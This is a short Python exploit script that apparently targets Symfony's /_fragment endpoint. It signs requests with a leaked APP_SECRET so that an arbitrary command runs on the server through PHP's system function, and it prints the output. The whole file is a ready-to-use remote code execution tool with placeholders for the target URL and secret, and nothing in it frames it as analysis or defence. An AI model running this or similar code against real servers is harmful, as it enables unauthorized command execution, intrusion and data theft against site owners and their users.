import sys
import requests
import hashlib
import hmac
from urllib import parse
from base64 import b64encode
from html2text import html2text

HEADER = {
    "Content-Type": "application/x-www-form-urlencoded",
}

URL = "URL_HERE" # Root webserver url
SECRET = b"APP_SECRET_HERE" # APP_SECRET (usually in php_info() or .htaccess)

def _get(param):
    job = {
        "_controller": "system",
        "command": param,
        "return_value": "null",
    }
    out = parse.quote(parse.urlencode(job))
    url = f"{URL}/_fragment?_path={out}"
    _hash = b64encode(hmac.HMAC(SECRET, url.encode(), hashlib.sha256).digest()).decode()
    url += f"&_hash={_hash}"
    return requests.get(url)

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 symfony-secret-rce.py <param>")
        return

    param = sys.argv[1]
    req = _get(param)
    print(html2text(req.text))

if __name__ == "__main__":
    main()

